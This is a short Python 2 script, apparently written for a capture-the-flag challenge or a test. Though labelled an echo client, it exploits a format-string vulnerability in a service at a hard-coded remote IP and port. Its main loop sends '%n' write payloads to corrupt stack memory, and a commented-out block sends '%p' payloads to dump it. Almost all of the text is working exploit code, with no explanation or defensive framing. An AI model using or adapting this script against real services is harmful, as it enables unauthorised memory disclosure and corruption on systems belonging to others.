# Echo client program
import socket
import os

# The remote host
HOST = '54.92.19.227'  
PORT = 8212

# write 4 in stack point memory(just test)
for i in range(1,1000):
        payload ='AAAA%' + str(i) +'$n'
        payload +="\x0a"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.recv(1024) #hello world!
        s.send(payload)
        s.recv(1024) #who are U?
        print str(i) + s.recv(8192)
        s.close()

# dump stack memory
'''
payload = '%16p %16p %16p %16p |'*47 + "\x0a"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.recv(1024) #hello world!
s.send(payload)
s.recv(1024) #who are U?
lists = s.recv(8192).split('|')
s.close()
for line in lists:
    print line
'''
